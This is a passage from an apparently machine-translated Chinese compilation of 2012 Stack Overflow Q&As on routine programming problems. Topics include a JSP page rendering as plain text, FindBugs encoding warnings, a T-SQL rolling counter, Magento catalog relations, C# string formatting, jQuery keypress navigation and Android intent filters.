<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0     Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html>
     <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>All Pending List </title>
         <style type="text/css">
            <!--
             @import"Image/cssmenuvertical.css";
             -->

          </style>

          <meta http-equiv="pragma" content="no-cache"/>
          <meta http-equiv="cache-control" content="no-cache"/>
          <meta http-equiv="expires" content="0"/>    
          <meta http-equiv="keywords" content="keyword1,keyword2,keyword3"/>
          <meta http-equiv="description" content="This is my page"/>

          <script language="JavaScript" type="text/JavaScript">

             function goToURL()
              {
                window.location="logout.jsp";

             }
             function bck()
            {
                window.history.forward();

            }
              setTimeout("bck()",0);
              </script>
              <title>All Pending Details</title>
         </head>

      <body bgcolor="lightblue">

         <% String val="for upload";
          session.setAttribute("val", val);
          %>
          <%            
              if (session.getAttribute("aa") != null) {

          %>
         <%            
             String findval = "find validation";
             session.setAttribute("findval", findval);%>
          <form id="form_id" action="" method="" >
              <table id='table1' align="center" >
                 <tr>
                     <td style="background-image: url(Image/header.jpg); width: 800px; height:           40px" color="lightblue"></td>
                      </tr>
                       <tr>
                         <td>

                         <ul id="navmenu">
                             <li><a href="#">Find ></a>
                                <ul>
                                    <li><a href="Find_ip.jsp">By IP </a></li>
                                   <li><a href="find_mac.jsp">By Mac Address </a></li>
                                <li><a href="find_date.jsp">By Date </a></li>
                                <li><a href="find_email.jsp">By Email </a></li>
                                <li><a href="find_approve">By Approved </a></li>
                                <li><a href="find_remove">By Removed </a></li>
                                 <li><a href="find_reg.jsp">By Registration ID</a></li>

                            </ul>
                        </li>

                        <li><a href="AlluploadedForms">| Uploaded Forms ></a></li>

                        <li>  <a href="logout.jsp">| Logout ></a>
                        </li>
                    </ul>
                </td>
            </tr>
        </table><br/>
        <center>
            <FONT COLOR="#0000FF" size="4"><b>All Pending List</b></FONT>
            <br/>
            <br/>
        </center>
        <center>
            <TABLE cellpadding="15" border="1" style="background-color: #C2DFFF">
                <th ><FONT COLOR="#0000FF">Registration NO.</FONT></th>
                <th><FONT COLOR="#0000FF">Administrator Name</FONT></th>
                <th><FONT COLOR="#0000FF"> Email</FONT></th>
                <th><FONT COLOR="#0000FF"> Division Name</FONT></th>
                <th><FONT COLOR="#0000FF"> Registration Date</FONT></th>

                <%                        

                    ArrayList all = (ArrayList) session.getAttribute("values");
                    Iterator i = all.iterator();
                    while (i.hasNext()) {
                        String t = (String) i.next();

                        out.println(t);

                    }

                %>

            </TABLE>
            <table><tr><td>
                        <input type="button" name="logout" value="Logout" onclick="goToURL();"/></td></tr></table>

            <%} else {
                    response.sendRedirect("logout.jsp");

                }%>

        </center>
    </form>
    <center><FONT COLOR="#0000FF"> Government Of India<br/>
            Ministry Of Communications and Information Technology<br/>
            Department of Information Technology </FONT></center>
</body> 
```

从 Firefox 登录该页面后

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T15:23:43.433

当内容被解释为`text/plain`而不是 as时，就会发生这种情况`text/html`。这只能意味着 HTTP 响应`Content-Type`已设置为`text/plain`，或已损坏或丢失。

使用 HTTP 流量检查器检查 HTTP 响应标头。如果您安装了[Firebug](http://getfirebug.com)，请按 F12 并检查*Net*选项卡。标题`Content-Type`必须至少说`text/html`. 默认情况下已经是这种情况。也许你有一些`Filter`做错了工作。

* * *

**与具体问题无关**，您与最初在问题中发布的 JSP 代码中指定响应字符编码不一致。您在 HTTP 响应标头中指定 ISO-8859-1，并在 HTML 元标头中指定 UTF-8。这是没有意义的。然而，这不应该导致这种问题。

顺便说一句，“信息技术系”，然后是那种老式的 JSP 编写风格，其中充满了已弃用的 HTML 元素和糟糕的做法......？这是一个爱好网站还是什么？

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-27T08:50:26.677

我尝试登录并且可以看到代码运行良好，根据此图像得到管理员无效错误：

![在此处输入图像描述](../Images/f3ada2d65d1071da5fa99e505f3b8b90.png)

# findbugs - 发现依赖默认编码

> ID：10347435
> 
> 赞同：65
> 
> 时间：2012-04-27T08:37:44.517
> 
> 标签：findbugs

我从 FindBugs 得到以下错误，

在 MyClass.print(String) 中发现对默认编码的依赖：String.getBytes()

**方法**

```
protected void print (String str) {
{
private OutputStream outStream = null;
.....
outStream.write(str.getBytes());
.......
} 
```

请让我知道错误是什么？我们如何解决这个问题？

提前致谢

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2012-05-22T16:11:54.220

将字符串编码为字节有不同的方法——字符集决定了编码。如果您没有指定字符集，如您对 的调用`str.getBytes()`，它将使用系统默认值。

FindBugs 警告您这一点，因为您应该考虑要用于输出的编码。如果您正在写入文件，该文件的读者会期待什么？如果您可以为文件指定显式编码，这样您就不会以一种方式编写它并以另一种方式读取它，这是最安全的。

例如，要指定显式字符集，`str.getBytes(Charset.forName("UTF-8"))`请使用 。UTF-8 是一个不错的选择，因为它始终受到支持并且可以编码任何字符。

例如，`.properties`文件总是 ISO 8859-1（即 Latin-1）。这已记录在案，因此使用什么编码没有歧义。

# c# - Skypekit C++ 如何获取每个联系人头像？

> ID：10347436
> 
> 赞同：0
> 
> 时间：2012-04-27T08:37:47.023
> 
> 标签：c#, wpf, web-services, skype, skype4com

我是 Skype 开发的新手。我想构建一个允许用户通过 Skype 帐户登录的应用程序。我可以使用 skypekit c++ 登录，我还列出了所有带有状态的联系人姓名。但我想显示每个联系人的联系人头像。

请一步一步告诉我...

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T20:22:50.730

`bool Contact`::[获取头像](http://developer.skype.com/skypekit/reference/cpp/class_contact.html#aa29bf3411b6a6f90e1f920817a7228c9)`(bool &present, Sid::Binary &avatar)`

返回联系人的头像图像 (JPG)。

`avatar`头像图像数据 (JPG)。如果 present 为 false，这将是 Skype 分配的默认头像。

*   请求头像
*   将其写入 file.jpg
*   用那个文件做任何你想做的事

# tsql - 滚动计数器

> ID：10347441
> 
> 赞同：1
> 
> 时间：2012-04-27T08:38:05.557
> 
> 标签：tsql, sql-server-2005

我需要使用这样的现有表格来促进滚动计数器：-

```
CREATE TABLE [dbo].[IdentityCounter](
    [CounterName] [nvarchar](255) NOT NULL,
    [StartId] [bigint] NOT NULL,
    [EndId] [bigint] NOT NULL,
    [CurrentId] [bigint] NOT NULL,
    [CreatedTime] [datetime] NULL,
    [ModifiedTime] [datetime] NULL,
    [Description] [nvarchar](255) NULL
) ON [PRIMARY] 
```

例如说我有以下内容： -

```
 CounterName  "ReceiptNumber"
 StartId  1
 EndId  99999 
 etc. etc. 
```

对于特定的 CounterName 我希望能够调用存储过程或函数来： -

*   为我获取下一个值并将其保存回 CurrentId 并将 CurrentId 作为结果发回

*   如果下一个值等于 EndId + 1，那么我需要使下一个值等于 StartId 并将其保存回 CurrentId。还将 CurrentId 作为结果发回。

*   将有多个应用程序调用它，因此需要确保事情保持一致。

计数器不是钥匙，它只是需要传递给第三方服务的东西。

最好的方法是什么？

谢谢！ITG

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T13:17:06.373

首先，我声明的数据看起来像您问题中的数据。如果您在问题中声明这一点会更好，以便我们都使用相同的数据。数据有一个区别：出于演示目的，EndID 是 5 而不是 99999。

```
INSERT INTO dbo.IdentityCounter(
  CounterName,
  StartID,
  EndID,
  CurrentID
)
VALUES (
  N'ReceiptNumber',
  1,
  5,
  1
); 
```

此过程可以满足您的要求：

```
CREATE PROCEDURE dbo.IncrementCounter (
  @CounterName NVARCHAR(255)
)
AS
BEGIN
  SET NOCOUNT ON;

  UPDATE dbo.IdentityCounter
  SET CurrentID = CASE WHEN CurrentID = EndID THEN StartID ELSE CurrentID + 1 END
  OUTPUT DELETED.CurrentID
  WHERE CounterName = @CounterName;
END; 
```

它返回一个“标量”结果集（一列，一行），它表示`CurrentID`在计数器递增之前给定 CounterName 的值。

重复执行示例：

```
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber';
EXEC dbo.IncrementCounter
  @CounterName = 'ReceiptNumber'; 
```

应该输出十个与此序列相似的结果集：`1`, `2`, `3`, `4`, `5`, `1`, `2`, `3`, `4`, `5`.

# magento - Magento 类别 <-> 产品 <-> 网站关系

> ID：10347443
> 
> 赞同：1
> 
> 时间：2012-04-27T08:38:13.993
> 
> 标签：magento

产品与一个类别以及一个类别与一个网站究竟是如何相关的？

我在 Magento 中有以下设置：

1）我在一个安装中拥有三个网站（特定于国家/地区）

2) 每个树形网站都有三个商店视图（特定于语言）

因此，总共有 10 个 core_store（1 个管理员 + 9 个）。

我的目标是支持以下场景：

1) 每个网站都有相同的类别，但是，有些网站对某些网站不活跃。

2) 产品可以是网站 X 中的一个类别的一部分，而不是网站 Y 中同一类别的一部分。它也可以是网站 X 和网站 Y 中同一类别的一部分

3) 一个类别可能对网站 X 有效，但对网站 Y 无效

我想知道这些“实体”在数据库级别/配置级别上的关系。任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T12:23:29.483

你想做的一切都可以完成。

通常情况下，需要写出范围场景，然后通过管理界面进行挖掘以查看可能的情况，因为有些事情无法在网站级别进行设置。

*   产品：`catalog_product_entity`
*   分类：`catalog_category_entity`
*   网站：`core_website`
*   商店：`core_store`

通过在商店级别将类别的 is_active（“活动”）值设置为 0（“否”），在商店级别禁用类别。这意味着“隐藏”给定网站的类别需要将类别设置为对网站的每个商店视图不活动。这可以在代码中使用更新脚本、直接在数据库中或在管理面板中完成。通过管理员，这是通过编辑类别并使用商店切换器来完成的：

![将切换器存储在类别管理员中](../Images/42ec6f34b3b525010dd6b6cf34a3813e.png)

产品的网站关联可以类似地单独编辑（使用“网站”选项卡）或使用网格顶部的过滤器和批量操作块的“更新属性”功能进行整体编辑。

此外，如果需要更改网站的分类，则需要一个新的根类别。

高温高压

# c++ - GCC 汇编代码生成错误和解决方法

> ID：10347446
> 
> 赞同：4
> 
> 时间：2012-04-27T08:38:26.390
> 
> 标签：c++, gcc, assembly, code-generation

GCC 4.5.2（在 Ubuntu 11.10 x64 上但编译为 32 位）生成无效的汇编代码，我很好奇是否可以在不更改代码的情况下修复，只需应用选项或类似的东西。请注意，优化已经是-O0。

我有两个功能：

```
inline long Class::Get()
{
    long v = *(long*)(m_p);
    m_p += 4;
    return v;
}
inline void Class::Command()
{
    m_p += Get();
} 
```

GCC 4.5.2 生成这个汇编代码：

```
 9840       m_p += Get();
f689eff5:   mov 0x8(%ebp),%eax
f689eff8:   mov 0xd4(%eax),%eax
f689effe:   mov %eax,%esi
f689f000:   mov 0x8(%ebp),%eax
f689f003:   mov %eax,(%esp)
f689f006:   call 0xf66116a0
f689f00b:   lea (%esi,%eax,1),%edx
f689f00e:   mov 0x8(%ebp),%eax
f689f011:   mov %edx,0xd4(%eax) 
```

如您所见，它将 m_p 值存储在 %esi 中，然后使用 lea 将返回值添加到它。**但是**::Get() 也确实改变了 m_p！GCC 似乎没有意识到这一点。因此，错误 m_p 不正确（比预期少 4 个字节），因为 %esi 中的值已过时。

我可以使用修复它

```
inline void Class::Command()
{
    long v = Get();
    m_p += v;
} 
```

但我只是想知道是否可以在不更改代码的情况下应用一些 pragma 或类似的东西来消除错误。至于 gcc 版本，我坚持使用给定的版本。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-27T08:47:27.113

那不是错误。如你所知，`m_p += Get();`是真的`m_p = m_p + Get();`。编译器可以自由选择加法的评估顺序。因此 fetching `m_p`，然后执行`Get()`，然后进行添加是有效的，并创建您刚刚发布的代码。

您的第二个示例不同，因为您创建了一个新的序列点。在这种情况下`Get()`，总是首先评估。

# database - 自动将 mailto: 添加到超链接字段

> ID：10347448
> 
> 赞同：1
> 
> 时间：2012-04-27T08:38:29.517
> 
> 标签：database, ms-access, hyperlink, mailto

Within my database I have a field that store email addresses, but when these are selected outlook will not open until I manually change the hyperlink to an email address. 反正有没有自动执行此操作，因为我有数千条记录。

或者甚至自动将术语“mailto：”添加到每个字段的开头，如果这可行，这会是一个更简单的选择吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T12:53:45.287

这可以通过一点点 VBA 来实现：

在表单上放置一个超链接组件，并在每次加载新数据集时更改字段属性：

```
Private Sub Form_Current()
  me.linkfield.caption="Click this to say hello to " & me![username]
  me.linkfield.hyperlinkadress="mailto:" & me![emailfield] & "?subject=" & me![greeting]
End Sub 
```

假设您的表格中有用户名、电子邮件字段和问候语字段。当然主题是可选的

# php - php双POST，1斜线到4斜线再回来

> ID：10347450
> 
> 赞同：2
> 
> 时间：2012-04-27T08:38:32.880
> 
> 标签：php, post, backslash

我对双 POST 方法有疑问。我必须让输出与输入完全相同。在 Linux、php v4 和魔术引号上运行。

1.  输入：你好\（单斜杠）
2.  第一篇文章：你好\（双反斜杠）
3.  第二个帖子：你好\\（四重反斜杠）
4.  预期：你好\（与输入相同）（单斜杠）
5.  实际结果：你好\（txt文件）（双斜杠）

第一个 post 方法是通过表单发布完成的，第二个 post 由 CURL 本身完成。是否有可能在不使用stripslashes的情况下最终获得 hello\ 的结果？

观察：当保存到文本文件时，消息“hello\\”被转换为“hello\”。这是如何发生的，为什么，以及我如何操纵结果来显示我的预期结果？PS由于一些奇怪的原因，斜线没有出现，添加了描述。问候。PS如果是我的编码问题，请给我一点时间来发布它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-03T16:07:40.697

PHP addlashes() 和 stripslahes() 对你有用。使用它们，但是您在这些步骤之间需要它们。

[http://php.net/addslashes](http://php.net/addslashes)

你丢失斜杠的原因是因为反斜杠是一个转义字符，告诉处理器从字面上获取下一个字符。所以要打印反斜杠，你需要转义一个反斜杠（双反斜杠 \ 变为 => 单反斜杠）

干杯! 担

# php - symfony 1.4 显示 500 内部服务器错误

> ID：10347453
> 
> 赞同：0
> 
> 时间：2012-04-27T08:38:48.053
> 
> 标签：php, symfony1, symfony-1.4

我在 Amazon AMI、Linux 上设置了 symfony 1.4。我已经配置了所有东西，但仍然收到 500 内部服务器错误。我也是 symfony 的新手。

这是我的虚拟主机条目：

```
<VirtualHost *:80>
    ServerName ec2-50-17-85-111.compute-1.amazonaws.com
    DocumentRoot "/var/www/html/flumenCode/web"
    DirectoryIndex index.php
    <Directory "/var/www/html/flumenCode/web">
            AllowOverride All
            Allow from All
    </Directory>
    Alias /sf /var/www/html/firstlumen/lib/vendor/symfony/data/web/sf
    <Directory "/var/www/html/firstlumen/lib/vendor/symfony/data/web/sf">
      AllowOverride All
      Allow from All
    </Directory>
</VirtualHost> 
```

我的错误日志显示：

```
[Fri Apr 27 08:49:11 2012] [error] [client 2.127.103.112] PHP Fatal error:  require():       Failed opening required '/var/www/html/flumenCode/cache/frontend/prod/config/config_config_handlers.yml.php' (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/flumenCode/lib/vendor/symfony/lib/config/sfConfigCache.class.php on line 279 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:02:15.693

正如@bacardnumberone 所说，这是一个缓存问题。跑：

```
sudo ./symfony project:permissions
./symfony cc 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:47:07.380

当遇到 HTTP 500 服务器错误时，您必须阅读 PHP 错误日志文件的最新行才能看到更详细的错误消息。

如果您不知道日志文件的位置，请使用：

```
<?php
phpinfo();
?> 
```

发现它的完整路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:00:50.587

这似乎是 symfony 缓存系统的问题。检查缓存文件夹权限。该文件夹对于运行 apache 的用户必须是可写的。

# c# - string.Format 与 string.Join

> ID：10347455
> 
> 赞同：17
> 
> 时间：2012-04-27T08:38:52.387
> 
> 标签：c#, string, formatting

我试过制作这样的字符串：

```
[1][2][3][4][5][6][7][8][9][10] 
```

使用此代码：

```
string nums = "[" + string.Join("][", Enumerable.Range(1, 10)) + "]"; 
```

但是，这看起来并不是很好，所以我想知道是否可以将*string.Format*与*string.Join*结合起来，有点像这样：

```
string num = string.Join("[{0}]", Enumerable.Range(1, 10)); 
```

这样它就可以在每个项目周围包裹一些东西。然而，结果是这样的：

```
1[{0}]2[{0}]3[{0}]4[{0}]5[{0}]6[{0}]7[{0}]8[{0}]9[{0}]10 
```

有没有更好/更简单的方法来做到这一点？

* * *

在所有解决方案中，我必须说我更喜欢这个

```
string s = string.Concat(Enumerable.Range(1, 4).Select(i => string.Format("SomeTitle: >>> {0} <<<\n", i))); 
```

超过这个

```
string s2 = "SomeTitle: >>>" + string.Join("<<<\nSomeTitle: >>>", Enumerable.Range(1, 4)) + "<<<\n"; 
```

因为所有格式都是在一个字符串中完成的，而不是多个。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-04-27T08:44:16.833

```
string.Concat(Enumerable.Range(1,10).Select(i => string.Format("[{0}]", i))) 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-11-15T09:54:52.127

我想要这样的东西，但可以输入格式字符串和分隔符。所以这就是我想出的：

```
public static string JoinFormat<T>(this IEnumerable<T> list, string separator,
                                   string formatString)
{
    formatString = string.IsNullOrWhiteSpace(formatString) ? "{0}": formatString;
    return string.Join(separator,
                       list.Select(item => string.Format(formatString, item)));
} 
```

现在你可以列出一个像

> [1]、[2]、[3]、[4]、[5]、[6]、[7]、[8]、[9]、[10]

通过输入`numbers.JoinFormat(", ", "[{0}]")`.

而一个`Concat`解决方案`"[{0}],")`将有一个尾随逗号。

空或`null`分隔符会生成您的列表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T08:46:19.727

我只是连接每个项目，并使用[`String.Concat`](https://docs.microsoft.com/en-us/dotnet/api/system.string.concat)将它们放在一起：

```
string num =
  String.Concat(
    Enumerable.Range(1, 10).Select(n => "[" + n + "]")
  ); 
```

如果您想花哨，可以在数字和字符串数组之间进行交叉连接。:)

```
string num =
  String.Concat(
    from n in Enumerable.Range(1, 10)
    from s in new string[] { "[", null, "]" }
    select s ?? n.ToString()
  ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-27T08:42:02.973

您可能正在寻找 LINQ 解决方案，例如

```
string nums = String.Concat(Enumerable.Range(1, 10)
                                      .Select(i => string.Format("[{0}]", i))) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-27T08:49:05.360

```
StringBuilder str = new StringBuilder();
for (int i = 1; i <= 10; i++)
    str.AppendFormat("[{0}]", i);

Console.WriteLine(str.ToString()); 
```

我的建议是使用 StringBuilder 附加相同的模式。

# nhibernate - 流畅的休眠配置 - UseOuterJoin(), ProxyFactoryFactory()

> ID：10347458
> 
> 赞同：1
> 
> 时间：2012-04-27T08:39:00.753
> 
> 标签：nhibernate, fluent-nhibernate

我看过以下代码行：

```
return MsSqlConfiguration.MsSql2008
                .UseOuterJoin()
                .ProxyFactoryFactory(typeof(ProxyFactoryFactory))
                .ConnectionString(x => x.FromConnectionStringWithKey("ApplicationServices"))
                .ShowSql(); 
```

查看流利的[维基](https://github.com/jagregory/fluent-nhibernate/wiki/Database-configuration)，我得到了关于“自我解释”的解释。如果有人解释 UseOuterJoin()、ProxyFactoryFactory() 的含义或提供阅读自己的链接，我将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T16:01:36.307

[http://nhibernate.info/doc/nh/en/index.html#configuration-optional-outerjoin](http://nhibernate.info/doc/nh/en/index.html#configuration-optional-outerjoin)

> 如果您的数据库支持 ANSI 或 Oracle 样式的外连接，则外连接获取可能会通过限制往返数据库的次数来提高性能（以数据库本身执行更多工作为代价）。外连接获取允许在单个 SQL SELECT 中检索通过多对一、一对多或一对一关联连接的对象图。
> 
> 默认情况下，加载对象时获取的图在叶对象、集合、具有代理的对象或发生循环的地方结束。
> 
> 对于特定关联，可以通过在 XML 映射中设置 fetch 属性来配置获取（并覆盖默认行为）。

[http://nhibernate.info/blogs/nhibernate/archive/2008/11/09/nh2-1-0-bytecode-providers.aspx](http://nhibernate.info/blogs/nhibernate/archive/2008/11/09/nh2-1-0-bytecode-providers.aspx)

ProxyFactoryFactory 只是指定如何创建代理。

# c# - C#动态添加图像到单元格

> ID：10347462
> 
> 赞同：0
> 
> 时间：2012-04-27T08:39:24.450
> 
> 标签：c#, image, datagridview

一直在玩我的程序的 UI，并且有一个小功能可以与同一行上的单元格进行比较并为该单元格分配颜色。我现在真正想要的是简单地将图像向上或向下箭头添加到该单元格。不幸的是，似乎没有一个班轮我很难相信。

这是我当前的代码：

```
DataGridViewImageCell p1 = new DataGridViewImageCell();

ParetoGrid.Columns.Add(new DataGridViewColumn() { CellTemplate = p1, FillWeight = 1, HeaderText = "p1", Name = "p1", Width = 30});

private void ShowArrow()
    {
        foreach (DataGridViewRow paretoRow in ParetoGrid.Rows)
        {
            if ((paretoRow.Cells["Pareto6"].Value != null) &&   (Convert.ToInt32(paretoRow.Cells["CurrentPareto"].Value) < (Convert.ToInt32(paretoRow.Cells["NewPareto"].Value))))
            {
                paretoRow.Cells["p1"].Value = //image?;
            }
            else if ((paretoRow.Cells["Pareto6"].Value != null) && (Convert.ToInt32(paretoRow.Cells["CurrentPareto"].Value) > (Convert.ToInt32(paretoRow.Cells["NewPareto"].Value))))
            {
                ParetoGrid.Rows[paretoRow.Index].DefaultCellStyle.BackColor = Color.LightGreen;
            }

        }
    } 
```

我希望有人知道有一个班轮。哦，我也想添加图像的列是 DataGridViewImageCell。

非常感谢！

到目前为止，我只是创建了一个新图像，然后

```
paretoRow.Cells["p1"].Value = theImage; 
```

我得到的问题是错误：格式化单元格的类型错误！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:06:52.573

您应该使用 DataGridTemplateColumn 包含图像控件。一般栏目不支持显示图片。

# jquery - Jquery，根据按键滚动div

> ID：10347464
> 
> 赞同：0
> 
> 时间：2012-04-27T08:39:33.233
> 
> 标签：jquery, jquery-ui, jquery-plugins, jquery-selectors, jquery-scrollable

我有一个 300px 固定高度的 div。在 div 内部有一个表格，该表格的输入高度较大，这使得 div 可以滚动（这是我的选择，所以我希望它溢出：自动）..我没有超过 300px 的空间使用按键事件我希望有人在表 tds 上上下移动，但是当他转到最后一个可见的 td 时，div 没有滚动，所以用户继续到下一个 td，但由于我想要的滚动，td 不再可见当他在最后一个可见的 td 中时向上滚动的 div 并在 td.height() 中滚动

请问有什么建议吗？

到目前为止，当有人用 up 和 down 按键更改 td 时，我添加了一个类

```
$(document).ready(function() {
    $('body').keypress(function(event){
    var a = $('#table .borderRed');

    if((event.keyCode)=="40"){
        a.parent().next().children().addClass('borderRed');
        a.removeClass('borderRed');
    }

    else if ((event.keyCode)=="38"){
        a.parent().prev().children().addClass('borderRed');
        a.removeClass('borderRed');
    }
    });
}); 
```

该表位于高度为：300px 的容器内；和溢出：自动；并且表的第一个 td 有一个类 1，这就是我要添加的类..

```
 .borderRed{ border: 1px solid red;}  
    .container {width: auto; height:300px; overflow:auto;} 
```

HTML

```
 <div class="container">
     <table id='table' width='100%'>
 <tr>
    <td class='borderRed'>1</td>
</tr>
<tr>
   <td>2</td>
</tr>
<tr>
   <td>3</td>
</tr>
<tr>
   <td>4</td>
</tr>
    <tr>
   <td>5</td>
</tr>
<tr>
   <td>6</td>
</tr>
<tr>
   <td>7</td>
</tr>
<tr>
    </table>
    </div> 
```

抱歉缩进。我是 stackoverflow 和 Jquery 的新手。我的 tds 已经达到 tp 16 以使表格滚动并测试功能或只是减少 300px 的高度

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-28T07:54:29.410

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
    <script src="../../Scripts/jquery-1.7.1.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            $('body').keypress(function (e) {
                var obj = $('#table').find('.borderRed');

                var code = (e.keyCode ? e.keyCode : e.which);

                if (code === 40) {
                    if ($('#table tr:last td:last').hasClass('borderRed') === true) {
                        $('#table tr:first td:first').addClass('borderRed');
                    }
                    else {
                        obj.parent().next().children().addClass('borderRed');
                    }
                    obj.removeClass('borderRed');
                }
                else if (code === 38) {
                    if ($('#table tr:first td:first').hasClass('borderRed') === true) {
                        $('#table tr:last td:last').addClass('borderRed');
                    }
                    else {
                        obj.parent().prev().children().addClass('borderRed');
                    }
                    obj.removeClass('borderRed');
                }
            });
        });
    </script>
    <style type="text/css">
        .borderRed
        {
            border: 1px solid red;
        }
        .container
        {
            width: auto;
            height: 300px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <table id='table' width='100%'>
            <tr>
                <td class='borderRed'>
                    1
                </td>
            </tr>
            <tr>
                <td>
                    2
                </td>
            </tr>
            <tr>
                <td>
                    3
                </td>
            </tr>
            <tr>
                <td>
                    4
                </td>
            </tr>
            <tr>
                <td>
                    5
                </td>
            </tr>
            <tr>
                <td>
                    6
                </td>
            </tr>
            <tr>
                <td>
                    7
                </td>
            </tr>
        </table>
    </div>
</body>
</html> 
```

# android - 当用户单击谷歌地图的链接时，如何提供我的程序作为选择？

> ID：10347471
> 
> 赞同：1
> 
> 时间：2012-04-27T08:39:58.607
> 
> 标签：android, maps

我有地图程序。当用户单击包含“mymaps.com”的 url 链接时 - 我的程序显示在选择器对话框中，以替代 Web 浏览器。当用户单击指向谷歌地图/网络或应用程序生成/的链接时，我也想做同样的事情。我发现了不同的 url 格式：

*   [http://m.google.com/u/m/zIOcsV](http://m.google.com/u/m/zIOcsV)
*   [http://maps.google.com/maps?q=45.089036,+-106.347656&num=1&t=h&vpsrc=0&ie=UTF8&z=4&iwloc=A](http://maps.google.com/maps?q=45.089036,+-106.347656&num=1&t=h&vpsrc=0&ie=UTF8&z=4&iwloc=A)

我想还有其他格式。有人知道如何拦截所有格式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:02:20.133

使用意图过滤器！请参阅此处了解更多信息：http: [//developer.android.com/guide/topics/intents/intents-filters.html](http://developer.android.com/guide/topics/intents/intents-filters.html)

在您的 android 清单中，在您要打开的活动的标记中添加以下内容：

```
<intent-filter>
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="http" android:host="maps.google.maps" android:pathPrefix="/maps" />
</intent-filter> 
```

然后在您的活动中创建一个名为：handleIntent 的方法，就像这样

```
private void handleIntent(Intent newIntent) {
      Uri myuri = newIntent.getData();
      (then use myuri to get your parameters such as q, num, etc)
      (then show your map or whatever else you like with that data)

} 
```

在您的 onCreate 中，您需要像这样调用 handleIntent

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    (init stuff would go here)
    handleIntent(getIntent());
} 
```

（可选）您可能需要像这样覆盖 onNewIntent（以防您的 AndroidManifest 活动 configchanges 属性被调整）

```
@Override 
protected void onNewIntent(Intent newIntent) {
    setIntent(newIntent);
    handleIntent(newIntent);
} 
```

# .net - 显示带有描述的对话框

> ID：10347474
> 
> 赞同：2
> 
> 时间：2012-04-27T08:40:09.767
> 
> 标签：.net, wpf, c#-4.0, user-experience, dialog

Microsoft 的[Windows 7 和 Windows Vista 用户体验交互指南建议创建带有](http://msdn.microsoft.com/en-us/library/windows/desktop/aa511258.aspx)*标题、**主要说明*和*上下文*的对话框。例如：

![在此处输入图像描述](../Images/8b8ab2ad61922bcb9a2dbd69d13f2349.png)

但是......`Show`类的方法[`MessageBox`](http://msdn.microsoft.com/en-us/library/system.windows.forms.messagebox.aspx)最多接受一个文本（=主指令）和一个标题（=标题）。

如何创建一个像上面那样的对话框，其中主要说明的蓝色大文本和上下文的黑色小文本？

我将 C# 与 .NET 4 和 WPF 一起使用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:43:27.240

那是一个[`TaskDialog`](http://msdn.microsoft.com/en-us/library/windows/desktop/bb760540%28v=vs.85%29.aspx)，它是在 Windows Vista 中引入的。有关如何使用它[的示例](http://www.dotnetthoughts.net/2011/06/30/how-to-use-taskdialog-api-in-c/)，请参阅this。如果您在早期版本的 Windows 上调用它，它将失败。您应该自己检查操作系统版本，并`MessageBox`在这种情况下调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:44:15.687

你可以从[这里](http://wpftoolkit.codeplex.com/)查看消息框。

和来自[这里](http://www.codeproject.com/Articles/30649/A-Customizable-WPF-TaskDialog)的任务对话框。

或者只是构建你想要的消息框。如何使用 mvvm 完成对话在[这里](https://stackoverflow.com/questions/3801681/good-or-bad-practise-for-dialogs-in-wpf-with-mvvm)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:30:39.547

[OOkii.Dialogs](http://www.ookii.org/software/dialogs/)是一个不错的小免费库，它消除了 WPF 的各种对话框的痛苦，包括在不支持新对话框的操作系统上处理回退到旧对话框。

# php - PHP分别识别每条记录

> ID：10347480
> 
> 赞同：1
> 
> 时间：2012-04-27T08:41:01.027
> 
> 标签：php

